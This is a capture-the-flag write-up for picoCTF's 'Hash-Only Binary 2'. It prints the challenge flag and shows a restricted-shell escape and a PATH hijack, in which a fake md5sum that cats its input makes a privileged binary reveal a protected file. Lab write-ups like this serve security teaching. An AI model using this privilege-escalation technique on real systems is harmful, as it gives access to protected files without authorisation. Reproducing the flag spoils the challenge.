# picoCTF Hash-Only Binary 2 Writeup

**Flag**: `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_fc0640ae}`

This is done on the PicoCTF servers which actually prohibit us from using GDB but we can assume that flaghasher works exactly the same as it did on Hash-Only-1. 

## Solution

We start in rbash but can escape with:
```bash
bash
```

This sequel works the same as Hash-Only-1, but the binary executes automatically - we can't interact with it directly.

Create a fake `md5sum` that just cats the file:
```bash
echo '#!/bin/bash' > ~/md5sum
echo 'cat "$1"' >> ~/md5sum
chmod +x ~/md5sum
```

Set PATH and the binary runs automatically:
```bash
PATH=~/:$PATH
```

The `flaghasher` binary executes on its own and outputs the flag instead of the hash.

## Key Points
- Same PATH hijacking technique as Hash-Only-1  
- Binary executes automatically, no manual interaction needed
- Create fake `md5sum` that cats instead of hashing